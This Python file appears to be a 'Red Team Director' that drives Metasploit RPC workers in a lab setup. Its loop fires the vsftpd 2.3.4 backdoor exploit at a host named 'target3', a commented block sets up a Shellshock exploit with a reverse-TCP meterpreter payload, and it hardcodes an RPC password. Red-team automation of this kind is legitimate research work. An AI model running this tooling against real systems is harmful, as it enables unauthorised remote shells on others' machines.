# -*- coding: utf-8 -*-
"""
Red Team Director
"""

import sys
import os
from time import sleep

from config import Config
import workers
import actions
from errors import ActionExecutionError


_appconfig = Config.from_environment(os.environ)
_log_director = _appconfig.log_director
_log_decision = _appconfig.log_decision
_msfrpc_hosts = os.environ['MSFRPC_HOSTS'].split(',')
_workers = {}
_exit = False


def main(args):
    """Main entry point allowing external calls
    Args:
      args ([str]): command line parameter list
    """
    _log_director.debug("Starting Director...")
    bootstrap_workers()
    while(not _exit):
        loop()
    _log_director.info("Director shutdown complete")


def bootstrap_workers():
    """Configure initial set of workers from environment
    """
    for host in _msfrpc_hosts:
        worker = workers.MsfRpcWorker(
            host=host.split(':')[0],
            port=int(host.split(':')[-1]) if ':' in host else 55553,
            username='director',
            password='directorU123',
            ssl=False,
            appconfig=_appconfig
        )
        _workers[worker.id] = worker
        worker.client()
        _log_director.debug('Worker connection test succeeded')


def loop():
    """Event loop
    """
    for id, worker in _workers.items():
        _log_director.debug('Processing worker {}'.format(id))
        action = plan_next_action(worker)
        execute_action(worker, action)
        report(worker)
    turn_sleep(_appconfig.turn_sleep)


def plan_next_action(worker):
    return {'type': 'noop'}


def execute_action(worker, action):
    _log_director.info('Executing')
    try:
        exploit_action = actions.ExecuteExploitAction(
            'unix/ftp/vsftpd_234_backdoor',
            'cmd/unix/interact',
            {
                'RHOSTS': 'target3',
                'VERBOSE': True,
            }
        )
        exploit_action.execute(worker.client())
    except ActionExecutionError:
        _log_director.warning('Failed to execute exploit action')
# result = run_exploit(
#     'multi/http/apache_mod_cgi_bash_env_exec',
#     'linux/x86/meterpreter/reverse_tcp',
#     {
#         'RHOSTS': 'target2',
#         'TARGETURI': '/cgi-bin/stats',
#         'VERBOSE': True,
#     }
# )


def report(worker):
    _log_director.info('Report')
    pass


def turn_sleep(seconds):
    _log_director.info(f'Waiting {seconds} seconds...')
    sleep(seconds)


def run():
    """Entry point for console_scripts
    """
    main(sys.argv[1:])


if __name__ == "__main__":
    run()
